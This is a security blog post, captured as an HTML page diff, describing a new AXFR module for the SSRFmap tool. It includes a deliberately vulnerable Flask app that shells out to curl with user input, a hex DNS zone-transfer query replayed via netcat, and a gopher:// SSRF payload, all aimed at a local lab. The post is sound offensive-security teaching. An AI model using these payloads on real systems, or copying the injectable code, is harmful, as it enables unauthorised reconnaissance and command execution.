@@ -1,0 +1,361 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola" />
+  <title>SSRFmap - Introducing the AXFR module | Swissky's Lab</title>
+  <meta property="og:site_name" content="Swissky&apos;s Lab" />
+  <meta property="og:title" content="SSRFmap - Introducing the AXFR module" />
+  <meta name="description" content="After reading a great blog post about a CTF challenge where you had to chain several SSRF to get the flag, I took some time to improve SSRFmap, fix the bugs and merge the Pull Requests. Then I impleme…" />
+  <meta property="og:description" content="After reading a great blog post about a CTF challenge where you had to chain several SSRF to get the flag, I took some time to improve SSRFmap, fix the bugs and merge the Pull Requests. Then I implemented a new module called axfr to trigger a DNS zone transfer from the SSRF using the gopher protocol…" />
+  <meta property="og:url" content="https://swisskyrepo.github.io/blog/ssrfmap-axfr/" />
+  <link rel="canonical" href="https://swisskyrepo.github.io/blog/ssrfmap-axfr/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2024-06-13T00:00:00+00:00" />
+  <meta property="og:image" content="https://swisskyrepo.github.io/images/SSRFmapAXFR/banner_text.png" />
+  <meta property="og:image:alt" content="SSRFmap - AXFR module" />
+  <meta property="og:image:width" content="1118" />
+  <meta property="og:image:height" content="624" />
+  <meta property="og:image:type" content="image/png" />
+  <link rel="alternate" type="application/atom+xml" href="https://swisskyrepo.github.io/atom.xml" title="Swissky&apos;s Lab | Atom" />
+  <link rel="alternate" type="application/rss+xml" href="https://swisskyrepo.github.io/rss.xml" title="Swissky&apos;s Lab | RSS" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://swisskyrepo.github.io/main.min.css?h=fc65ba308cf36d3ba82c" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://swisskyrepo.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://swisskyrepo.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://swisskyrepo.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://swisskyrepo.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://swisskyrepo.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://swisskyrepo.github.io/files/custom.css">
+
+<!-- HEAD END -->
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://swisskyrepo.github.io/" class="text-2xl font-semibold">Swissky&#x27;s Lab</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://swisskyrepo.github.io/elasticlunr.min.js", "https://swisskyrepo.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/projects"
+          >Projects</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://swisskyrepo.github.io/about"
+          >About</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">SSRFmap - Introducing the AXFR module</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2024-06-13T00:00:00+00:00">2024-06-13</time><span
+        class="mx-1">&middot;</span><time
+    datetime="PT0H6M0S">6&nbsp;min</time>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://swisskyrepo.github.io/images/SSRFmapAXFR/banner_text.png"
+      alt="SSRFmap - AXFR module"
+      width="1118"
+      height="624"
+    />
+  </figure>
+  <!-- TOC -->
+<div class="block-bg mb-12 rounded-lg p-2 text-lg">
+  <details>
+    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
+      <span class="cursor-pointer">Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/ssrfmap-axfr/#ssrf-lab">SSRF Lab</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/ssrfmap-axfr/#axfr-query">AXFR Query</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/ssrfmap-axfr/#gopher-protocol">Gopher Protocol</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/ssrfmap-axfr/#bug-fix-in-libcurl">Bug Fix in libcurl</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://swisskyrepo.github.io/blog/ssrfmap-axfr/#references">References</a>
+        </li>
+      </ul>
+    </div>
+  </details>
+</div>
+
+  <!-- Content -->
+  <section><p>After reading a great blog post about a CTF challenge where you had to chain several SSRF to get the flag, I took some time to improve SSRFmap, fix the bugs and merge the Pull Requests. Then I implemented a new module called <code>axfr</code> to trigger a DNS zone transfer from the SSRF using the gopher protocol. This blog post is about my journey on implementing it.</p>
+<p><img src="/images/SSRFmapAXFR/banner_text.png" alt="" /></p>
+<span id="continue-reading"></span>
+<p>Before going further, we need to define what is a DNS zone transfer. Let's ask ChatGPT for a quick description of this interesting DNS feature.</p>
+<blockquote>
+<p>A DNS zone transfer is a process used to replicate the DNS records from the master DNS server to secondary DNS servers. This ensures that all the DNS servers in a domain have the same information, which is crucial for redundancy and load balancing. Zone transfers are typically initiated by the secondary server, requesting a copy of the DNS zone file from the primary server. They can be done in two main ways: full zone transfer (AXFR) and incremental zone transfer (IXFR).</p>
+</blockquote>
+<p><a href="https://github.com/swisskyrepo/SSRFmap">SSRFmap</a> is a tool I started 6 years ago, I'm proud to release the v2 now, with new modules, improvements for the Docker container, and new SSRF scenarios in the tests cases. Also issues have been fixed and dependencies upgraded. It should be a breeze to use it for your SSRF exploitation scenario, either in CTF and real world targets.</p>
+<h2 id="ssrf-lab">SSRF Lab</h2>
+<p>Now let's create a lab with a basic SSRF vulnerability and a DNS service. For the SSRF we will use the examples of SSRFmap: <a href="https://github.com/swisskyrepo/SSRFmap/blob/master/examples/example.py">SSRFmap/examples/example.py</a>, which is just a Flask app with the endpoint <code>ssrf</code> that will spawn a <code>curl</code> command with the provided URL.</p>
+<p>⚠️ This code is vulnerable to SSRF but also to Remote Command Execution. Be careful when you run it, and restrict your network interactions.</p>
+<pre data-lang="py" style="background-color:#2b303b;color:#c0c5ce;" class="language-py "><code class="language-py" data-lang="py"><span style="color:#b48ead;">from </span><span>flask </span><span style="color:#b48ead;">import </span><span>Flask, request 
+</span><span style="color:#b48ead;">import </span><span>re
+</span><span style="color:#b48ead;">import </span><span>subprocess
+</span><span style="color:#b48ead;">import </span><span>urllib.parse
+</span><span>
+</span><span>app = </span><span style="color:#bf616a;">Flask</span><span>(__name__)
+</span><span>
+</span><span>@app.</span><span style="color:#bf616a;">route</span><span>(&quot;</span><span style="color:#a3be8c;">/ssrf</span><span>&quot;, </span><span style="color:#bf616a;">methods</span><span>=[&#39;</span><span style="color:#a3be8c;">POST</span><span>&#39;])
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">ssrf</span><span>():
+</span><span>    data = request.values
+</span><span>    content = </span><span style="color:#bf616a;">command</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">curl </span><span>{data.</span><span style="color:#bf616a;">get</span><span>(&#39;</span><span style="color:#a3be8c;">url</span><span>&#39;)}&quot;)
+</span><span>    </span><span style="color:#b48ead;">return </span><span>content
+</span></code></pre>
+<p>We also need the file <a href="https://github.com/swisskyrepo/SSRFmap/blob/master/examples/ssrf_dns.py">SSRFmap/examples/ssrf_dns.py</a> from the examples folder. Then we start both, either on your machine with <code>python examples/example.py</code> and <code>python examples/ssrf_dns.py</code> or with the docker commands to have every requirements correctly installed:</p>
+<pre data-lang="ps1" style="background-color:#2b303b;color:#c0c5ce;" class="language-ps1 "><code class="language-ps1" data-lang="ps1"><span>docker build --no-cache -t ssrfmap .
+</span><span>docker run -it -v $(pwd):/usr/src/app --name example ssrfmap examples/example.py
+</span><span>docker exec -u root:root -it example python examples/ssrf_dns.py
+</span></code></pre>
+<p>Now you should be able to interact with the ssrf service using a curl command: <code>curl -i -X POST -d 'url=http://example.com' http://localhost:5000/ssrf</code>, and it will fetch the content of the example.com website.</p>
+<p>The best way to debug when you are sending queries over the network is to run <code>wireshark</code> in the background. This way you can inspect the request, save the payload and even replay it later.</p>
+<h2 id="axfr-query">AXFR Query</h2>
+<p>Let's start with a simple AXFR query directly to the DNS server: <code>dig @127.0.0.1 -p 53 example.lab AXFR</code></p>
+<p>In this example:</p>
+<ul>
+<li><code>@127.0.0.1</code>: specify the DNS server to query</li>
+<li><code>53</code> is the port number to connect to on the DNS server</li>
+<li><code>example.lab</code> is the domain name for which the DNS records are being queried</li>
+<li><code>AXFR</code>, the type of DNS query to execute</li>
+</ul>
+<p>Our wireshark capture contains the AXFR query.</p>
+<p><img src="/images/SSRFmapAXFR/wireshark-dns.png" alt="" /></p>
+<p>Let's inspect the query in details using the wireshark dissector:</p>
+<p><img src="/images/SSRFmapAXFR/wireshark-data-text.png" alt="" /></p>
+<p>This DNS query can be extracted as hex with <code>Copy as hex stream</code> in Wireshark: <code>0034a9c100200001000000000001076578616d706c65036c61620000fc000100002904d000000000000c000a0008180f72afca818649</code></p>
+<p><img src="/images/SSRFmapAXFR/wireshark-data-hex.png" alt="" /></p>
+<p>The AXFR request format is as follow.</p>
+<p><strong>Header</strong></p>
+<table><thead><tr><th>Data</th><th>Description</th></tr></thead><tbody>
+<tr><td>XX</td><td>Length</td></tr>
+<tr><td>XXXX</td><td>Two-byte query ID selected by the client</td></tr>
+<tr><td>0020</td><td>Standard query</td></tr>
+<tr><td>00</td><td>Recursion not available, no Z bits, RCODE 0</td></tr>
+<tr><td>0001</td><td>Exactly one question</td></tr>
+<tr><td>0000</td><td>Answer records</td></tr>
+<tr><td>0000</td><td>Authority records</td></tr>
+<tr><td>0001</td><td>Additional records</td></tr>
+</tbody></table>
+<p><strong>Query</strong></p>
+<table><thead><tr><th>Data</th><th>Description</th></tr></thead><tbody>
+<tr><td>07</td><td>Length domain part 1: 7</td></tr>
+<tr><td>6578616d706c65</td><td>Domain part 1: <code>example</code></td></tr>
+<tr><td>03</td><td>Length domain part 2: 3</td></tr>
+<tr><td>6c616</td><td>Domain part 2: <code>lab</code></td></tr>
+<tr><td>00fc</td><td>AXFR query: 252</td></tr>
+<tr><td>0001</td><td>Internet query class</td></tr>
+</tbody></table>
+<p><strong>Additional Record</strong></p>
+<p>This part is not essential for our exploit, but I included it in this blog post for the sake of completeness.</p>
+<table><thead><tr><th>Data</th><th>Description</th></tr></thead><tbody>
+<tr><td>00</td><td>Name</td></tr>
+<tr><td>0029</td><td>Type OPT</td></tr>
+<tr><td>04d00</td><td>UDP payload</td></tr>
+<tr><td>00</td><td>Something?</td></tr>
+<tr><td>00</td><td>EDNSO version</td></tr>
+<tr><td>0000</td><td>Z</td></tr>
+<tr><td>00c0</td><td>Data length</td></tr>
+<tr><td>00a0008180f72afca818649</td><td>Option COOKIE</td></tr>
+</tbody></table>
+<p>We will replay this query using <code>netcat</code> on port 53 (TCP). This works because the DNS server from <code>ssrf_dns.py</code> is listening on both UDP and TCP.</p>
+<pre data-lang="ps1" style="background-color:#2b303b;color:#c0c5ce;" class="language-ps1 "><code class="language-ps1" data-lang="ps1"><span>echo 0034a9c100200001000000000001076578616d706c65036c61620000fc000100002904d000000000000c000a0008180f72afca818649 | xxd -r -p | nc </span><span style="color:#d08770;">127.0</span><span>.</span><span style="color:#d08770;">0.1 53
+</span></code></pre>
+<p>But we can shorten this payload by removing the <code>Additional records</code>, change <code>01</code> to <code>00</code> in the correct part of the header.
+Don't forget to change the length in the header section.</p>
+<pre data-lang="ps1" style="background-color:#2b303b;color:#c0c5ce;" class="language-ps1 "><code class="language-ps1" data-lang="ps1"><span style="color:#65737e;"># Payload: 00[LENGTH]a9c1002000010000000000[ADDITIONAL_RECORD]076578616d706c65036c61620000fc0001 
+</span><span>echo 001da9c100200001000000000000076578616d706c65036c61620000fc0001 | xxd -r -p | nc </span><span style="color:#d08770;">127.0</span><span>.</span><span style="color:#d08770;">0.1 53
+</span></code></pre>
+<p><img src="/images/SSRFmapAXFR/out-xfr-answer.png" alt="" /></p>
+<p>Finally, the server answers with 4 subdomains on <code>example.lab</code>.</p>
+<pre data-lang="ps1" style="background-color:#2b303b;color:#c0c5ce;" class="language-ps1 "><code class="language-ps1" data-lang="ps1"><span>frontend.example.lab.   </span><span style="color:#d08770;">0       </span><span style="color:#b48ead;">IN</span><span>      A       </span><span style="color:#d08770;">10.10</span><span>.</span><span style="color:#d08770;">10.10
+</span><span>backend.example.lab.    </span><span style="color:#d08770;">0       </span><span style="color:#b48ead;">IN</span><span>      A       </span><span style="color:#d08770;">10.10</span><span>.</span><span style="color:#d08770;">10.11
+</span><span>secret_flag.example.lab. </span><span style="color:#d08770;">0      </span><span style="color:#b48ead;">IN</span><span>      A       </span><span style="color:#d08770;">10.10</span><span>.</span><span style="color:#d08770;">10.12
+</span><span>test.example.lab.       </span><span style="color:#d08770;">0       </span><span style="color:#b48ead;">IN</span><span>      A       </span><span style="color:#d08770;">10.10</span><span>.</span><span style="color:#d08770;">10.12
+</span></code></pre>
+<h2 id="gopher-protocol">Gopher Protocol</h2>
+<p>Now the next step is to transform this request to be able to send it through an SSRF. For this, we will use the gopher protocol.</p>
+<blockquote>
+<p>The Gopher protocol (/ˈɡoʊfər/) is a communication protocol designed for distributing, searching, and retrieving documents in Internet Protocol networks. - Wikipedia</p>
+</blockquote>
+<p>It is very easy to use this protocol with the gopher scheme: <code>gopher://IP:PORT/_DATA</code>.</p>
+<p>In theory, the payload should be as follow: <code>gopher://127.0.0.1:53/_%00%1d%a9%c1%00%20%00%01%00%00%00%00%00%00%07%65%78%61%6d%70%6c%65%03%6c%61%62%00%00%fc%00%01</code>. The final exploit requires an URL encoding.</p>
+<pre data-lang="ps1" style="background-color:#2b303b;color:#c0c5ce;" class="language-ps1 "><code class="language-ps1" data-lang="ps1"><span>curl -s -i -X POST -d &#39;</span><span style="color:#a3be8c;">url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%25
+</span><span style="color:#a3be8c;">6d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501</span><span>&#39; http://localhost:</span><span style="color:#d08770;">5000</span><span>/ssrf --output - | xxd
+</span></code></pre>
+<h2 id="bug-fix-in-libcurl">Bug Fix in libcurl</h2>
+<p>However, in my first attempt it didn't work because the gopher protocol is not accepting a NULL BYTE (<code>%00</code>). I went into the issues of the curl project and I discovered this one : <a href="https://github.com/curl/curl/issues/9089">issues/9089</a></p>
+<blockquote>
+<p>Yes, using libcurl/7.47.0. I can run this command curl 'gopher://127.0.0.1:1234/_%0012' without any error.</p>
+</blockquote>
+<p>It picked my interest, here is a small table with known vulnerable version.</p>
+<table><thead><tr><th>libcurl version</th><th>Vuln ?</th></tr></thead><tbody>
+<tr><td>7.47.0</td><td>Vulnerable</td></tr>
+<tr><td>7.71.0</td><td>Vulnerable</td></tr>
+<tr><td>7.79.1</td><td>Not vulnerable</td></tr>
+<tr><td>8.X</td><td>Not vulnerable</td></tr>
+</tbody></table>
+<p>A patch seems to be implemented since version 7.71.1 <a href="https://github.com/curl/curl/commit/31e53584db5879894809fbde5445aac7553ac3e2">Commit #31e53584db5879894809fbde5445aac7553ac3e2</a>.</p>
+<p><img src="/images/SSRFmapAXFR/null-byte-not-supported.png" alt="" /></p>
+<p>Anyway, if you encounter a vulnerable version in the wild, the final code for the module is released here: <a href="https://github.com/swisskyrepo/SSRFmap/blob/master/modules/axfr.py">swisskyrepo/SSRFmap/modules/axfr.py</a> and you can use the following command line to use it.</p>
+<pre data-lang="ps1" style="background-color:#2b303b;color:#c0c5ce;" class="language-ps1 "><code class="language-ps1" data-lang="ps1"><span>docker exec -it example python ssrfmap.py -r examples/request.txt -p url -m axfr --lhost </span><span style="color:#d08770;">127.0</span><span>.</span><span style="color:#d08770;">0.1 </span><span>--lport </span><span style="color:#d08770;">53 </span><span>--ldomain example.lab
+</span></code></pre>
+<p><img src="/images/SSRFmapAXFR/module-output.jpg" alt="" /></p>
+<h2 id="references">References</h2>
+<p>This blog post was inspired by these great write-ups of the FCSC 2024 challenges. Have a look at them ! :)</p>
+<ul>
+<li><a href="https://vozec.fr/writeups/pong-fcsc2024-en/">https://vozec.fr/writeups/pong-fcsc2024-en/</a></li>
+<li><a href="https://mizu.re/post/pong">https://mizu.re/post/pong</a></li>
+<li><a href="https://gist.github.com/Siss3l/32591a6d6f33f78bb300bfef241de262">https://gist.github.com/Siss3l/32591a6d6f33f78bb300bfef241de262</a></li>
+</ul>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/pokemon-glitches/" accesskey=","
+    ><span class="mr-1.5">&#8249;</span><span>Anatomy of Pokemon glitches</span></a>
+  <a
+    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
+    href="https://swisskyrepo.github.io/blog/ph0wn-flag-digger/" accesskey="."
+    ><span>Ph0wn CTF 2019 - Flag Digger</span><span class="ml-1.5">&#8250;</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  <!-- Share page -->
+<br>
+
+<div class="robots-nocontent social-share-buttons">
+  <b>Share this content</b>
+  <br>
+  <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+    <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+    <a class="a2a_button_x"></a>
+    <a class="a2a_button_linkedin"></a>
+    <a class="a2a_button_telegram"></a>
+    <a class="a2a_button_mastodon"></a>
+    <a class="a2a_button_email"></a>
+    <a class="a2a_button_microsoft_teams"></a>
+    <a class="a2a_button_threads"></a>
+    <a class="a2a_button_bluesky"></a>
+    <a class="a2a_button_whatsapp"></a>
+  </div>
+  <br>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+</div>
+  <!-- End Page End inject -->
+</article>
+
+  </main>
+  <!-- Footer -->
+<footer class="mx-auto flex lg:mt-5 max-w-3xl flex-wrap items-center px-4 py-3 text-sm opacity-60">
+  <div class="mr-auto basis-full lg:basis-1/2">
+  <a href="https://creativecommons.org/licenses/by-sa/4.0/deed">© <time datetime="2017">2017</time> - <time datetime="2025">2025</time> Swissky</a>
+  </div>
+  <div class="flex basis-full lg:basis-1/2 lg:justify-end">
+    <span class="mr-6 lg:ml-6">
+      <a class="link" href="https://www.getzola.org/" target="_blank">Powered by Zola</a>
+    </span>
+    <a class="link" href="https://www.getzola.org/themes/linkita/" target="_blank">&#9998; Linkita</a>
+  </div>
+  <!-- Begin Footer inject -->
+  
+  <!-- End Footer inject -->
+</footer>
+
+  
+  <!-- Begin Body End inject -->
+  
+  <!-- End Body End inject -->
+</body>
+
+</html>
